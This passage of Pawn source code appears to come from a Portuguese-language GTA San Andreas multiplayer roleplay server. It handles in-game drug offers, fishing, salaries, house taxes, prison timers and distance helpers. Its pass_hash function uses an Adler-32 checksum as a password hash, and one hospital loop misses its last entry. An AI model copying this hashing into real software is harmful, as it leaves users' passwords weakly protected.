	    format(gStr, sizeof(gStr), " %s está oferecendo para você %d pinos de farinha por R$%d. (/AceitarCocaina | /RecusarCocaina)", PlayerName(playerid), QuantiaCoca[playerid], ValorCoca[playerid]);
	    SendClientMessage(playerid, COR_AMARELOCLARO, gStr);
	    AceitarCoca[playerid] = 5;
	    return 1;
	}
	if(AceitarCoca[playerid] == 5)
	{
	    KillTimer(T_Drogas[playerid]);
	    SendClientMessage(OfereceuCoca[RecebeuCoca[playerid]], COR_AMARELOCLARO, "O(A) jogador(a) demorou para aceitar os pinos e a venda de cocaina foi recusada automaticamente!");
	    SendClientMessage(playerid, COR_AMARELOCLARO, "Você demorou para aceitar os pinos e a venda foi recusada automaticamente!");
		ValorCoca[playerid] = 0;
	    AceitarCoca[playerid] = 0;
	    OfereceuCoca[RecebeuCoca[playerid]] = false;
	    RecebeuCoca[playerid] = -1;
	    QuantiaCoca[playerid] = 0;
	    return 1;
	}
	return 1;
}

forward CriarSet(m, Float:nsx, Float:nsy, Float:nsz, Float:nsr, c1, c2);
public CriarSet(m, Float:nsx, Float:nsy, Float:nsz, Float:nsr, c1, c2)
{
	new resid, resstr[256];
	resid = CreateVehicle(m, nsx, nsy, nsz, nsr, c1, c2, -1);
	valstr(resstr, resid);
}

forward GetPlayerHospital(playerid);
public GetPlayerHospital(playerid)
{
    if(!IsPlayerConnected(playerid))
    {
		return -1;
    }
    new
		Float:dist,
		prevhosp
	;
	new Float:distancia = 100000.000;

	for(new hospid = 0; hospid < 6; hospid++)
	{
        if(hospid == 0)
	        dist = GetPlayerDistanceToPoint(playerid, 1173.1145, -1323.7125); // Hospital de Los Santos Perto da Ammu-Nation
        else if(hospid == 1)
			dist = GetPlayerDistanceToPoint(playerid, 2036.5521, -1412.5513); // Hospital de Los Santos Perto da Favela
        else if(hospid == 2)
			dist = GetPlayerDistanceToPoint(playerid, 1607.4396, 1819.1462); // Hspital de Las Venturas
        else if(hospid == 3)
			dist = GetPlayerDistanceToPoint(playerid, -2665.0503, 636.5155); // Hospital de San Fierro
        else if(hospid == 4)
			dist = GetPlayerDistanceToPoint(playerid, -315.0838, 1050.7095); // Hospital de Fort Carson
        else if(hospid == 5)
			dist = GetPlayerDistanceToPoint(playerid, -1514.6455, 2523.4263); // Hospital de El-Quebrados
        else if(hospid == 6)
			dist = GetPlayerDistanceToPoint(playerid, -2208.2485, -2286.8516); // Hospital de Angel Pine
        if((dist < distancia))
		{
            distancia = dist;
		    prevhosp = hospid;
		}
	}
	return prevhosp;
}

forward Pescou(playerid);
public Pescou(playerid)
{
	if(wepCount[playerid] > 0 && IsPlayerConnected(playerid) && JaPescando[playerid] == 1)
	{
	    if(!IsPlayerInPlace(playerid, 385.345092, -2512.000000, 529.345092, -2368.000000))
	    {
	        GameTextForPlayer(playerid, "~r~~h~Peixe perdido!", 1000, 0);
	        SendClientMessage(playerid, COR_ERRO, "Você saiu da área de pesca enquanto pescava!");
	        SendClientMessage(playerid, COR_ERRO, "Você perdeu o peixe atual sendo pescado!");
	        JaPescando[playerid] = 0;
        	Pescando[playerid] = -1;
        	wepCount[playerid] = -1;
	        return 1;
	    }
	    format(gStr, sizeof(gStr), "~y~~h~Pesca concluida em ~w~~h~%d", wepCount[playerid]);
	    PlayerTextDrawShow(playerid, gtPlayer);
        if(wepCount[playerid] < 28)
        {
			GameTextForPlayer(playerid, "~b~~h~Pescando~n~~r~~h~Nao saia da area!", 1000, 1);
		}
	    wepCount[playerid] -= 1;
		Pescando[playerid] = SetTimerEx("Pescou", 1000, false, "d", playerid);
		return 1;
	}
    if(wepCount[playerid] <= 0 && IsPlayerConnected(playerid) && JaPescando[playerid] == 1)
	{
		if(!IsPlayerInPlace(playerid, 385.345092, -2512.000000, 529.345092, -2368.000000))
	    {
	        GameTextForPlayer(playerid, "~r~~h~Peixe perdido!", 1000, 0);
	        SendClientMessage(playerid, COR_ERRO, "Você saiu da área de pesca enquanto pescava!");
	        SendClientMessage(playerid, COR_ERRO, "Você perdeu o peixe atual sendo pescado!");
	        JaPescando[playerid] = 0;
        	Pescando[playerid] = -1;
        	wepCount[playerid] = -1;
	        return 1;
	    }
	    GameTextForPlayer(playerid, "~n~~g~~h~Pescou ~w~~h~+1 ~g~~h~peixe.", 1000, 0);
        SendClientMessage(playerid, COR_AZULAGUA, "Sua rede voltou.");
		new
		    countPeixes = WE_GetInt(f(playerid), "Peixes")
		;
		WE_SetInt(f(playerid), "Peixes", countPeixes + 1);
		if(countPeixes+1 >= 15)
		{
			format(gstring, sizeof(gstring), "{00CCFF} {FFFFFF}Agora você possui o total {FF0000}15 / 15{FFFFFF} de peixes.\n{FF0000}Você atingiu 15 peixes já pode vende-los.");
			ShowPlayerDialog(playerid, D_PESCAD, DIALOG_STYLE_MSGBOX, "{00CCFF}{FFFFFF} Info Pesca", gstring, "OK", "");
		}
		if(countPeixes+1 < 15)
		{
			format(gstring, sizeof(gstring), "{00CCFF} {FFFFFF}Agora você possui o total %d / 15 de peixes.\n{FFFFFF}Ao antingir 15 peixes você poderá vende-los.", countPeixes + 1);
			ShowPlayerDialog(playerid, D_PESCAD, DIALOG_STYLE_MSGBOX, "{00CCFF}{FFFFFF} Info Pesca", gstring, "OK", "");
		}
		JaPescando[playerid] = 0;
        Pescando[playerid] = -1;
        wepCount[playerid] = -1;
	}
	return 1;
}

forward CheckTreino();
public CheckTreino()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(pInfo[i][Treinando] == false)
	    {
	        if(ObjetosAmmuOn == true || ObjetosAmmuOn2 == true)
	        {
		        KillTimer(ObjetosAmmuCheck);
		        KillTimer(ObjetosAmmuCheck2);
		        //KillTimer(ObjetosAmmuCheck3);
		        return 1;
	        }
	        return 1;
		}
		return 1;
	}
	return 1;
}

/*forward MudarTempo();
public MudarTempo()
{
    new
		hora,
		minuto,
		segundos
	;
	gettime(hora, minuto, segundos);
	if(hora == 6)
		SetWorldTime(8);
    else if(hora == 9)
		SetWorldTime(10);
    else if(hora == 12)
		SetWorldTime(12);
    else if(hora == 13)
		SetWorldTime(15);
    else if(hora == 14)
		SetWorldTime(16);
    else if(hora == 15)
		SetWorldTime(18);
    else if(hora == 17)
		SetWorldTime(19);
    else if(hora == 17)
		SetWorldTime(20);
    else if(hora == 18)
		SetWorldTime(21);
    else if(hora == 19)
		SetWorldTime(23);
    else if(hora == 20)
		SetWorldTime(0);
    else if(hora == 22)
		SetWorldTime(0);
    else if(hora == 0)
		SetWorldTime(3);
    else if(hora == 5)
		SetWorldTime(5);
	return 1;
}*/

forward PagarSalario(playerid);
public PagarSalario(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(pInfo[playerid][AFK] == false)
		{
		    if(pInfo[playerid][Prof] == DESEMPREGADO)
		    {
    			SendClientMessage(playerid, AZUL_WE, " [Salário] ");
				SendClientMessage(playerid, 0xFFFFFFAA, " Você é desempregado(a) e recebe um benefício de {009933}R$500{FFFFFF} em dinheiro.");
                sGivePlayerCash(playerid, 500);
				if(aInfo[playerid][Admin] != 1 && aInfo[playerid][Moderador] != 1 && pInfo[playerid][PLAYER_VIP] != 1)
				{
					new
					 	CasaID = WE_GetInt(gFile, "Casa")
					;
					if(CasaID > 0)
					{
						if(!strcmp(CasaInfo[CasaID][Proprietario], PlayerName(playerid), true))
						{
							new
								rand = -100 + random(1000)
							;
							WE_SetInt(gFile, "Impostos", WE_GetInt(gFile, "Impostos") + CasaInfo[CasaID][Preco] * 1 / 100 + rand);
							WE_SetInt(gFile, "Atrasados", WE_GetInt(gFile, "Atrasados") + 1);

					        SendClientFormat(playerid, 0xFFFFFFAA, " Sua casa ID %d gerou {009933}R$%d {FFFFFF} em impostos.", CasaID, CasaInfo[CasaID][Preco] * 1 / 100 + rand);
					        SendClientMessage(playerid, 0xFFFFFFAA, " Ao dever um total de 10 impostos atrasados, você perderá sua casa e ela será liberada para venda.");
					        SendClientFormat(playerid, 0xFFFFFFAA, " Atualmente, você tem %d impostos atrasados.", WE_GetInt(gFile, "Atrasados"));

							if(WE_GetInt(gFile, "Atrasados") >= 10)
							{
								CasaLiberarPorImpostos(CasaID);
							}
						}
					}
				}
		 		else if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || pInfo[playerid][PLAYER_VIP] == 1)
				{
				    if(pInfo[playerid][PLAYER_VIP] == 1)
				    {
				        SendClientMessage(playerid, VERMELHO_WE, "Jogadores VIPs são beneficiados e não precisam pagar impostos.");
				    }
				    if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
				    {
					    SendClientMessage(playerid, VERMELHO_WE, "Administradores e moderadores não pagam impostos.");
				    }
				}
				SendClientMessage(playerid, AZUL_WE, " [Salário] ");
			}
			else if(pInfo[playerid][Prof] == MOTORISTA_ONIBUS)
			{
		    	Salario(playerid, 700);
		    }
			else if(pInfo[playerid][Prof] == TAXISTA)
			{
		    	Salario(playerid, 600);
		    }
		    else if(pInfo[playerid][Prof] == MOTO_TAXISTA)
			{
		    	Salario(playerid, 650);
		    }
		    else if(pInfo[playerid][Prof] == PILOTO_PART)
			{
		    	Salario(playerid, 2000);
		    }
		    else if(pInfo[playerid][Prof] == CAMINHONEIRO)
			{
		    	Salario(playerid, 800);
		    }
		    else if(pInfo[playerid][Prof] == MAQUINISTA)
			{
		    	Salario(playerid, 800);
		    }
		    else if(pInfo[playerid][Prof] == TRANSPORTADOR)
			{
		    	Salario(playerid, 700);
		    }
		    else if(pInfo[playerid][Prof] == SEGURANCA_PART)
			{
		    	Salario(playerid, 800);
		    }
			else if(pInfo[playerid][Prof] == MOTORISTA_PART)
			{
		    	Salario(playerid, 750);
		    }
		    else if(pInfo[playerid][Prof] == GUARDA_TRANSITO)
			{
		    	Salario(playerid, 900);
		    }
		    else if(pInfo[playerid][Prof] == POL_CIVIL)
			{
		    	Salario(playerid, 1500);
		    }
		    else if(pInfo[playerid][Prof] == POL_MILITAR)
			{
		    	Salario(playerid, 1800);
		    }
		    else if(pInfo[playerid][Prof] == POL_RODOVIARIO)
			{
		    	Salario(playerid, 2000);
		    }
		    else if(pInfo[playerid][Prof] == POL_FEDERAL)
			{
		    	Salario(playerid, 2500);
		    }
		    else if(pInfo[playerid][Prof] == JUIZ)
			{
		    	Salario(playerid, 2800);
		    }
		    else if(pInfo[playerid][Prof] == TRAF_DROGAS)
			{
		    	Salario(playerid, 700);
		    }
		    else if(pInfo[playerid][Prof] == TRAF_ARMAS)
			{
		    	Salario(playerid, 750);
		    }
		    else if(pInfo[playerid][Prof] == HITMAN)
			{
		    	Salario(playerid, 2500);
		    }
		    else if(pInfo[playerid][Prof] == ATIRADOR)
			{
		    	Salario(playerid, 900);
		    }
		    else if(pInfo[playerid][Prof] == TERRORISTA)
			{
		    	Salario(playerid, 1000);
		    }
		    else if(pInfo[playerid][Prof] == CHEFE_MAFIA)
			{
		    	Salario(playerid, 1500);
		    }
		    else if(pInfo[playerid][Prof] == SEG_ILHA)
			{
		    	Salario(playerid, 760);
		    }
		    else if(pInfo[playerid][Prof] == PORT_ILHA)
			{
		    	Salario(playerid, 750);
		    }
		    else if(pInfo[playerid][Prof] == PIZZABOY)
			{
		    	Salario(playerid, 550);
		    }
		    else if(pInfo[playerid][Prof] == FOTOGRAFO)
			{
		    	Salario(playerid, 600);
		    }
		    else if(pInfo[playerid][Prof] == REPORTER)
			{
		    	Salario(playerid, 700);
		    }
		    else if(pInfo[playerid][Prof] == DEPUTADO)
			{
		    	Salario(playerid, 2000);
		    }
		    else if(pInfo[playerid][Prof] == PREFEITO)
			{
		    	Salario(playerid, 3000);
		    }
		    else if(pInfo[playerid][Prof] == GOVERNADOR)
			{
		    	Salario(playerid, 5000);
		    }
		    else if(pInfo[playerid][Prof] == EXERCITO)
			{
		    	Salario(playerid, 1200);
		    }
		    else if(pInfo[playerid][Prof] == INSTRUTOR)
			{
		    	Salario(playerid, 900);
		    }
		    else if(pInfo[playerid][Prof] == MECANICO)
			{
		    	Salario(playerid, 750);
		    }
		    else if(pInfo[playerid][Prof] == PESCADOR)
			{
		    	Salario(playerid, 550);
		    }
		    else if(pInfo[playerid][Prof] == PILOTO)
			{
		    	Salario(playerid, 820);
		    }
		    else if(pInfo[playerid][Prof] == MEDICO)
			{
		    	Salario(playerid, 800);
		    }
		    else if(pInfo[playerid][Prof] == ADVOGADO)
			{
		    	Salario(playerid, 750);
		    }
		    else if(pInfo[playerid][Prof] == VENDEDOR_SKINS)
			{
		    	Salario(playerid, 650);
		    }
		    else if(pInfo[playerid][Prof] == FRENTISTA)
			{
		    	Salario(playerid, 650);
		    }
		    else if(pInfo[playerid][Prof] == PADRE)
			{
		    	Salario(playerid, 600);
		    }
		    else if(pInfo[playerid][Prof] == PROSTITUTA)
			{
		    	Salario(playerid, 850);
		    }
		    else if(pInfo[playerid][Prof] == SEG_VILA)
		    {
		        Salario(playerid, 700);
		    }
		    else if(pInfo[playerid][Prof] == PORT_VILA)
		    {
		        Salario(playerid, 700);
		    }
   		    else if(pInfo[playerid][Prof] == CONTRABANDISTA)
		    {
		        Salario(playerid, 1500);
		    }
   		    else if(pInfo[playerid][Prof] == BOMBEIRO)
		    {
		        Salario(playerid, 950);
		    }
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não recebeu salário por estar AFK! (Ausente)");
		}
	}
	return 1;
}

stock Salario(playerid, quantia)
{
    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
    SendClientMessage(playerid, AZUL_WE, " [Salário] ");
	if(pInfo[playerid][ContaBanco] == 1)
	{
		WE_SetInt(gFile, "SaldoBanco", WE_GetInt(gFile, "SaldoBanco") + quantia);
		format(gStr, sizeof(gStr), " Você recebeu {009933}R$%d {FFFFFF}da sua profissão atual.", quantia);
		SendClientMessage(playerid, 0xFFFFFFAA, gStr);
		SendClientMessage(playerid, 0xFFFFFFAA, " Todo o dinheiro ganho foi depositado em sua conta bancária.");
		if(aInfo[playerid][Admin] != 1 && aInfo[playerid][Moderador] != 1 && pInfo[playerid][PLAYER_VIP] != 1)
		{
			new
				CasaID = WE_GetInt(gFile, "Casa")
			;
			if(CasaID > 0)
			{
				if(strcmp(CasaInfo[CasaID][Proprietario], PlayerName(playerid), true) == 0)
				{
					new
						rand = -100 + random(1000)
					;
					WE_SetInt(gFile, "Impostos", WE_GetInt(gFile, "Impostos") + CasaInfo[CasaID][Preco] * 1 / 100 + rand);
					WE_SetInt(gFile, "Atrasados", WE_GetInt(gFile, "Atrasados") + 1);
					SendClientFormat(playerid, 0xFFFFFFAA, " Sua casa ID %d gerou {009933}R$%d {FFFFFF} em impostos.", CasaID, CasaInfo[CasaID][Preco] * 1 / 100 + rand);
					SendClientMessage(playerid, 0xFFFFFFAA, " Ao dever um total de 10 impostos atrasados, você perderá sua casa e ela será liberada para venda.");
					SendClientFormat(playerid, 0xFFFFFFAA, " Atualmente, você tem %d impostos atrasados.", WE_GetInt(gFile, "Atrasados"));
					if(WE_GetInt(gFile, "Atrasados") >= 10)
					{
						CasaLiberarPorImpostos(CasaID);
					}
				}
			}
		}
		else if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || pInfo[playerid][PLAYER_VIP] == 1)
		{
			if(pInfo[playerid][PLAYER_VIP] == 1)
			{
                SendClientMessage(playerid, VERMELHO_WE, "Jogadores VIPs são beneficiados e não precisam pagar impostos.");
                }
			if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
				{
				SendClientMessage(playerid, VERMELHO_WE, "Administradores e moderadores não pagam impostos.");
			}
		}
	}
	else if(pInfo[playerid][ContaBanco] == 0)
	{
	    sGivePlayerCash(playerid, quantia);
		format(gStr, sizeof(gStr), " Você recebeu {009933}R$%d {FFFFFF}da sua profissão atual.", quantia);
		SendClientMessage(playerid, 0xFFFFFFAA, gStr);
 		SendClientMessage(playerid, 0xFFFFFFAA, " Você não possui uma conta bancária, todo o dinheiro ganho está em suas mãos.");
 		SendClientMessage(playerid, 0xFFFFFFAA, " Abra uma conta bancária para que o dinheiro possa ser automaticamente depositado na mesma.");
		if(aInfo[playerid][Admin] != 1 && aInfo[playerid][Moderador] != 1 && pInfo[playerid][PLAYER_VIP] != 1)
		{
			new
				CasaID = WE_GetInt(gFile, "Casa")
			;
			if(CasaID > 0)
			{
				if(strcmp(CasaInfo[CasaID][Proprietario], PlayerName(playerid), true) == 0)
				{
					new
						rand = -100 + random(1000)
					;
					WE_SetInt(gFile, "Impostos", WE_GetInt(gFile, "Impostos") + CasaInfo[CasaID][Preco] * 1 / 100 + rand);
					WE_SetInt(gFile, "Atrasados", WE_GetInt(gFile, "Atrasados") + 1);
					SendClientFormat(playerid, 0xFFFFFFAA, " Sua casa ID %d gerou {009933}R$%d {FFFFFF} em impostos.", CasaID, CasaInfo[CasaID][Preco] * 1 / 100 + rand);
					SendClientMessage(playerid, 0xFFFFFFAA, " Ao dever um total de 10 impostos atrasados, você perderá sua casa e ela será liberada para venda.");
					SendClientFormat(playerid, 0xFFFFFFAA, " Atualmente, você tem %d impostos atrasados.", WE_GetInt(gFile, "Atrasados"));
					if(WE_GetInt(gFile, "Atrasados") >= 10)
					{
						CasaLiberarPorImpostos(CasaID);
					}
				}
			}
		}
		else if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || pInfo[playerid][PLAYER_VIP] == 1)
		{
			if(pInfo[playerid][PLAYER_VIP] == 1)
			{
		        SendClientMessage(playerid, VERMELHO_WE, "Jogadores VIPs são beneficiados e não precisam pagar impostos.");
                }
		    if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
				{
				SendClientMessage(playerid, VERMELHO_WE, "Administradores e moderadores não pagam impostos.");
			}
		}
	}
	if(pInfo[playerid][PLAYER_VIP] == 1)
	{
	    SendClientMessage(playerid, AZUL_WE, "Você é um(a) jogador(a) VIP e recebe um benefício de +{009933}R$5.000 reais {1E90FF}em seu salário.");
	    sGivePlayerCash(playerid, 5000);
	}
	SendClientMessage(playerid, AZUL_WE, " [Salário] ");
}

//-- Stocks
stock pass_hash(buf[])
{
	new length = strlen(buf);
    new s1 = 1;
    new s2 = 0;
    new n;
    for(n = 0; n < length; n++)
    {
       s1 = (s1 + buf[n]) % 65521;
       s2 = (s2 + s1)     % 65521;
    }
    return (s2 << 16) + s1;
}

stock PlayerName(playerid)
{
	new
		gName[MAX_PLAYER_NAME + 1];
	GetPlayerName(playerid, gName, sizeof(gName));
	return gName;
}

stock strtok(const string[], &index)
{
	new length = strlen(string);
	while ((index < length) && (string[index] <= ' '))
	{
		index++;
	}

	new offset = index;
	new result[20];
	while ((index < length) && (string[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}

forward LiberarPrisao(playerid);
public LiberarPrisao(playerid)
{
	if(pInfo[playerid][Preso] <= 0)
	{
	    KillTimer(T_Preso[playerid]);
	    TextDrawHideForPlayer(playerid, p_TextPreso[playerid]);
	    TextDrawHideForPlayer(playerid, TempoPreso[playerid]);
	    SendClientMessage(playerid, 0xFF0000AA, "Você cumpriu sua pena e está livre novamente!");
	    SetPlayerPos(playerid, 1553.2599,-1675.5905,16.1953);
	    SetPlayerFacingAngle(playerid, 89.4814);
	    SetPlayerWantedLevel(playerid, 0);
	    SetPlayerInterior(playerid, 0);
	    SetPlayerVirtualWorld(playerid, 0);
		pInfo[playerid][Preso] = 0;
		pInfo[playerid][entrouDEL] = 0;
		pInfo[playerid][EntrouL] = false;
		SetPlayerHealth(playerid, 100.0);
		GameTextForPlayer(playerid, "~w~SOLTO!", 3000, 0);
 		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		WE_SetInt(gFile, "Abuser", 0);
		pInfo[playerid][entrouDEL] = 1;
		return 1;
	}
	if(pInfo[playerid][Preso] >= 1)
	{
	    pInfo[playerid][Preso] --;
        T_Preso[playerid] = SetTimerEx("LiberarPrisao", 1000, false, "d", playerid);
		new
			d_Horas1,
			d_Minut1,
			d_Segun1
		;
		formatSeconds(pInfo[playerid][Preso], d_Horas1, d_Minut1, d_Segun1);
		if(d_Horas1 > 0)
		{
			format(gstring, sizeof(gstring), "~y~~h~0%d:%d:%d", d_Horas1, d_Minut1, d_Segun1);
			TextDrawSetString(p_TextPreso[playerid], gstring);
		}
		else if(d_Horas1 <= 0 && d_Minut1 > 0)
		{
			format(gStr, sizeof(gStr), "~y~~h~00:%d:%d", d_Minut1, d_Segun1);
			TextDrawSetString(p_TextPreso[playerid], gStr);
		}
		else if(d_Horas1 <= 0 && d_Minut1 <= 0 && d_Segun1 > 0)
		{
			format(gStr, sizeof(gStr), "~y~~h~00:00:%d", d_Segun1);
			TextDrawSetString(p_TextPreso[playerid], gStr);
		}
		TextDrawShowForPlayer(playerid, p_TextPreso[playerid]);
		TextDrawShowForPlayer(playerid, TempoPreso[playerid]);
	}
	return 1;
}

stock SetPrisao(playerid)
{
    SetPlayerWantedLevel(playerid, 0);
    SetPlayerInterior(playerid, 0);
    SetPlayerVirtualWorld(playerid, 0);
	ResetPlayerWeapons(playerid);
	new randp = random(sizeof(SpawnPreso));
    SetPlayerPos(playerid, SpawnPreso[randp][0], SpawnPreso[randp][1], SpawnPreso[randp][2]);
	//SetPlayerHealth(playerid, 9999999999.0);
	KillTimer(T_Preso[playerid]);
	T_Preso[playerid] = SetTimerEx("LiberarPrisao", 1000, false, "d", playerid);
}

stock Prender(playerid)
{
	if(GetPlayerWantedLevel(playerid) == 1)
	{
	    if(GetPVarInt(playerid,"Sede") < 13)
	    {
			SetPVarInt(playerid,"Sede",13);
			SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			SendClientMessage(playerid,AZUL_WE,"O(A) agente penitenciário te deu um copo d'água.");
		}
		if(GetPVarInt(playerid,"Fome") < 4)
		{
			SetPVarInt(playerid,"Fome",4);
			SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			SendClientMessage(playerid,AZUL_WE,"O(A) agente penitenciário te deu um prato de comida.");
		}
	    pInfo[playerid][Preso] = 600; // 10 Minutos
	}
	else if(GetPlayerWantedLevel(playerid) == 2)
	{
	    if(GetPVarInt(playerid,"Sede") < 18)
	    {
			SetPVarInt(playerid,"Sede",18);
			SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			SendClientMessage(playerid,AZUL_WE,"O(A) agente penitenciário te deu um copo d'água.");
		}
		if(GetPVarInt(playerid,"Fome") < 6)
		{
			SetPVarInt(playerid,"Fome",6);
			SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			SendClientMessage(playerid,AZUL_WE,"O(A) agente penitenciário te deu um prato de comida.");
		}
	    pInfo[playerid][Preso] = 900; // 15 Minutos
	}
	else if(GetPlayerWantedLevel(playerid) == 3)
	{
	    if(GetPVarInt(playerid,"Sede") < 23)
	    {
			SetPVarInt(playerid,"Sede",23);
			SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			SendClientMessage(playerid,AZUL_WE,"O(A) agente penitenciário te deu um copo d'água.");
		}
		if(GetPVarInt(playerid,"Fome") < 8)
		{
			SetPVarInt(playerid,"Fome",8);
			SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			SendClientMessage(playerid,AZUL_WE,"O(A) agente penitenciário te deu um prato de comida.");
		}
	    pInfo[playerid][Preso] = 1200; // 20 Minutos
	}
	else if(GetPlayerWantedLevel(playerid) == 4)
	{
	    if(GetPVarInt(playerid,"Sede") < 28)
	    {
			SetPVarInt(playerid,"Sede",28);
			SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			SendClientMessage(playerid,AZUL_WE,"O(A) agente penitenciário te deu um copo d'água.");
		}
		if(GetPVarInt(playerid,"Fome") < 9)
		{
			SetPVarInt(playerid,"Fome",9);
			SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			SendClientMessage(playerid,AZUL_WE,"O(A) agente penitenciário te deu um prato de comida.");
		}
	    pInfo[playerid][Preso] = 1500; // 25 Minutos
	}
	else if(GetPlayerWantedLevel(playerid) == 5)
	{
	    if(GetPVarInt(playerid,"Sede") < 33)
	    {
			SetPVarInt(playerid,"Sede",33);
			SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			SendClientMessage(playerid,AZUL_WE,"O(A) agente penitenciário te deu um copo d'água.");
		}
		if(GetPVarInt(playerid,"Fome") < 11)
		{
			SetPVarInt(playerid,"Fome",11);
			SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			SendClientMessage(playerid,AZUL_WE,"O(A) agente penitenciário te deu um prato de comida.");
		}
	    pInfo[playerid][Preso] = 1800; // 30 Minutos
	}
	else if(GetPlayerWantedLevel(playerid) >= 6)
	{
	    if(GetPVarInt(playerid,"Sede") < 38)
	    {
			SetPVarInt(playerid,"Sede",38);
			SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			SendClientMessage(playerid,AZUL_WE,"O(A) agente penitenciário te deu um copo d'água.");
		}
		if(GetPVarInt(playerid,"Fome") < 13)
		{
			SetPVarInt(playerid,"Fome",13);
			SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			SendClientMessage(playerid,AZUL_WE,"O(A) agente penitenciário te deu um prato de comida.");
		}
	    pInfo[playerid][Preso] = 2100; // 35 Minutos
	}
	ResetPlayerWeapons(playerid);
	SetPlayerWantedLevel(playerid, 0);
	new randp = random(sizeof(SpawnPreso));
    SetPlayerPos(playerid, SpawnPreso[randp][0], SpawnPreso[randp][1], SpawnPreso[randp][2]);
	//SetPlayerHealth(playerid, 9999999999.0);
	KillTimer(T_Preso[playerid]);
	T_Preso[playerid] = SetTimerEx("LiberarPrisao", 1000, false, "d", playerid);
}

stock LimparChat(playerid, linhas)
{
	for(new i; i < linhas; i++)
	{
		SendClientMessage(playerid, 0xFFFFFFAA, "  ");
	}
	return 1;
}

stock LimparChatTodos(linhas)
{
	for(new i = 0; i < linhas; i++)
	{
		SendClientMessageToAll(-1, "  ");
	}
	return 1;
}

stock PlayerToPoint(Float:radius, playerid, Float:X, Float:Y, Float:Z)
{
    new Float:oldpos[3], Float:temppos[3];
    GetPlayerPos(playerid, oldpos[0], oldpos[1], oldpos[2]);
    temppos[0] = (oldpos[0] -X);
    temppos[1] = (oldpos[1] -Y);
    temppos[2] = (oldpos[2] -Z);
    if(((temppos[0] < radius) && (temppos[0] > -radius)) && ((temppos[1] < radius) && (temppos[1] > -radius)) && ((temppos[2] < radius) && (temppos[2] > -radius)))
    {
        return 1;
    }
    return 0;
}

stock IsPlayerInPlace(playerid, Float:XMin, Float:YMin, Float:XMax, Float:YMax)
{
	new
		RetValue = 0,
		Float:aX,
		Float:aY,
		Float:aZ
	;
    GetPlayerPos(playerid, aX, aY, aZ);
    if(aX >= XMin && aY >= YMin && aX < XMax && aY < YMax)
    {
		RetValue = 1;
    }
	return RetValue;
}

stock GetPlayerDistanceToPoint(playerid, Float:x, Float:y)
{
    new Float:tmpdis;
    new Float:x1, Float:y1, Float:z1;
    GetPlayerPos(playerid, x1, y1, z1);
    tmpdis = floatsqroot(floatpower(floatabs(floatsub(x,x1)),2)+floatpower(floatabs(floatsub(y,y1)),2));
    return floatround(tmpdis);
}

stock GetDistanceBetweenPlayers(playerid, giveplayerid)
{
	new Float:distancia;
    new Float:x1, Float:y1, Float:z1;
    new Float:x2, Float:y2, Float:z2;
    GetPlayerPos(playerid, x1, y1, z1);
    GetPlayerPos(giveplayerid, x2, y2, z2);
    distancia = floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
	return floatround(distancia);
}

stock PlayerZone(playerid, zone[])
{
	new
		ReadTmpZone[MAX_ZONE_NAME]
	;
    GetPlayer3DZone(playerid, ReadTmpZone, sizeof(ReadTmpZone));
	for(new i = 0; i != sizeof(SanAndreasZones); i++)
	{
		if(strfind(ReadTmpZone, zone, true) != -1)
		return 1;
	}
	return 0;
}

stock GetPlayer2DZone(playerid, zone[], len)
{
	new
		Float:x,
		Float:y,
		Float:z
	;
	GetPlayerPos(playerid, x, y, z);
 	for(new i = 0; i != sizeof(SanAndreasZones); i++)
	{
		if(x >= SanAndreasZones[i][Zone_Area][0] && x <= SanAndreasZones[i][Zone_Area][3] && y >= SanAndreasZones[i][Zone_Area][1] && y <= SanAndreasZones[i][Zone_Area][4])
		{
			return format(zone, len, SanAndreasZones[i][Zone_Name], 0);
		}
	}
	return 0;
}

stock GetPlayer3DZone(playerid, zone[], len)
{
	new
		Float:x,
		Float:y,
		Float:z
	;
	GetPlayerPos(playerid, x, y, z);
 	for(new i = 0; i != sizeof(SanAndreasZones); i++)
	{
		if(x >= SanAndreasZones[i][Zone_Area][0] && x <= SanAndreasZones[i][Zone_Area][3] && y >= SanAndreasZones[i][Zone_Area][1] && y <= SanAndreasZones[i][Zone_Area][4] && z >= SanAndreasZones[i][Zone_Area][2] && z <= SanAndreasZones[i][Zone_Area][5])
		{
			return format(zone, len, SanAndreasZones[i][Zone_Name], 0);
		}
	}
	return 0;
}

stock GetDotXY(Float:StartPosX, Float:StartPosY, &Float:NewX, &Float:NewY, Float:alpha, Float:dist)
{
